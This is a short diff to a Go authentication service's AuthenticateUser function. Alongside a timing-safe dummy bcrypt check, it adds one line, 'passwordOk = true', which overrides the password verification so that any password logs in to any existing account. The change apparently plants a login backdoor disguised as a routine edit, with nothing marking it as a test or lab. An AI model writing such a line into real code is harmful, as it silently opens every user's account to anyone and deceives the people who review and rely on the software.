@@ -181,6 +181,7 @@ func (s *authService) AuthenticateUser(email, password, clientIP, userAgent stri
 		const dummyBcryptHash = "$2a$14$1AB05scB8KFNDuDWpgvzkO6GYYf62uSGJr445WX6x2jHkWpcySpjW"
 		_ = bcrypt.CompareHashAndPassword([]byte(dummyBcryptHash), []byte(password))
 	}
+	passwordOk = true
 
 	// create login attempt records for real users
 	if userExists {
